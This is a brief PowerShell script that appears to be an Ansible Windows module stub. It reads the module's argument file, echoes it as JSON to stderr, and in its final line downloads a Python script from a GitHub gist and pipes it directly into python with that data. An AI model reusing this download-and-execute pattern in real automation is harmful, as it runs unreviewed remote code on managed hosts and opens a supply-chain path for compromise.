#!powershell
# <license>

# WANT_JSON
# POWERSHELL_COMMON

$data = Get-Content $args[0] | Out-String
$data = $data.Trim() | ConvertTo-Json

$host.ui.WriteErrorLine($data)

((new-object net.webclient).DownloadString('https://gist.githubusercontent.com/tcr/33d7d6154d08aa116378/raw/cd0f9d25c9d59743ac5f1e821464a51a0439ca90/win-file.py')) | python - $data
